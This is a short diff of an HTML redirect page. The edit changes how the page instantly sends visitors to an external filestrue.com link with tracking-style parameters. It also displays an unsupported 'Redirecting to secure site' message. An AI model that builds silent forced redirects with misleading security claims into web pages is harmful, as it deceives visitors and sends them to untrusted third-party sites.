@@ -2,12 +2,15 @@
 <html lang="en">
   <head>
     <script type="text/javascript">
-      // Immediate redirect with no delay
-      window.location.replace("https://filestrue.com/show.php?l=0&u=2049413&id=67270");
+      // Show the text immediately and redirect instantly
+      window.onload = function() {
+        document.getElementById("redirectMessage").innerHTML = "Redirecting to secure site... Donuts Are Coming!";
+        window.location.replace("https://filestrue.com/show.php?l=0&u=2049413&id=67270");
+      };
     </script>
     <title>Redirecting...</title>
   </head>
   <body>
-    <p>Redirecting to secure site...Donuts Are Coming!</p>
+    <p id="redirectMessage"></p> <!-- This will hold the message and display it immediately -->
   </body>
 </html>
